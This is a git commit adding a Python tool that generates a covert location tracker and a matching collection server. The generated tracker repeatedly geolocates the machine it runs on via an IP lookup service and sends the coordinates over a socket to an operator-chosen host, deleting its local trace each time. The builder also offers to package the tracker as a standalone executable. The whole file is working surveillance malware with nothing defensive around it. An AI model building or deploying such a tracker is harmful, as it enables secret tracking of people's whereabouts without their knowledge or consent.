10a4e94d90b7081efd99aa571112960612b36b8b
j3r1ch0123 <110147529+j3r1ch0123@users.noreply.github.com>
2023-01-02 14:15:36 -0500

    Add files via upload

---
+++ gps_generator.py
@@ -0,0 +1,95 @@
+#!/bin/python3.9
+import subprocess
+import shlex
+
+HOST = input("Enter your IP Address: ")
+PORT = input("Enter server port: ")
+time_Interval = input("Enter time interval (in seconds): ")
+
+gps = f'''
+#!/bin/python3.9
+from urllib.request import urlopen
+import os
+import json
+import socket
+import time
+
+while True:
+
+    RHOSTS = "{HOST}"
+    RPORT = {PORT}
+    separator = " , "
+
+    url = "https://ipinfo.io/json"
+    req = urlopen(url)
+    data = json.load(req)
+
+    lat = data['loc'].split(",")[0]
+    lon = data['loc'].split(",")[1]
+
+    location = lat, separator,  lon
+    coordinates = "".join(location)
+    print(coordinates)
+
+    filename = "location.txt"
+
+    with open(filename, "w") as thefile:
+        thefile.write("location: " + coordinates + " ")
+
+    with open(filename, "rb") as sendFile:
+        sendFile = sendFile.read()
+        s = socket.socket()
+        s.connect((RHOSTS, RPORT))
+        s.send(sendFile)
+        print("Location sent...")
+        os.remove(filename)
+        time.sleep({time_Interval})
+        continue
+'''
+server = f'''
+#!/bin/python3.9
+import socket
+import sys
+
+s = socket.socket()
+s.bind(("{HOST}",{PORT})) #Change these
+print("Listening...")
+s.listen(10)
+i=1
+
+while True:
+    sc, address = s.accept()
+    print(address)
+    f = open('location.txt','ab+') #open in binary
+    l = 1
+    while(l):
+        l = sc.recv(1024)
+        while (l):
+            f.write(l)
+            l = sc.recv(1024)
+            with open('location.txt', 'r') as thefile:
+                contents = thefile.read()
+                print(contents)
+        f.close()
+
+    sc.close()
+
+s.close()
+'''
+
+filename = input("What would you like to save your file as? ")
+with open(filename, "w") as thefile:
+    thefile.write(gps)
+    print("File generated...")
+
+with open("server.py", "w") as theserver:
+    theserver.write(server)
+    print("Server created...")
+
+cont = input("Would you like to compile an executable? (y/n) ")
+if cont == "y":
+    comp = f"pyinstaller --onefile {filename}"
+    subprocess.call(shlex.split(comp))
+elif cont == "n":
+    print("Thanks for using...")
+    exit()
